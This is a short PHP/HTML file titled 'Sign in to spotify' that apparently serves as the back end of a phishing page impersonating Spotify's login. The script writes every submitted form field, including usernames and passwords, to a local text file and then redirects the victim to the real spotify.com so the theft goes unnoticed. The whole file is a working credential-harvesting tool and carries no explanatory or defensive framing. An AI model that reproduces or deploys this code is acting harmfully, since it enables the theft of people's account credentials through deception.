<!DOCTYPE html>
<html>
<head>
	<title>Sign in to spotify</title>
</head>
<body>
<?php
header ('Location: spotify.com ');
$handle = fopen("spotify.txt.txt", "a");
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");}
fwrite($handle, "===============\r\n");
fclose($handle);
exit;
?>
</body>
</html>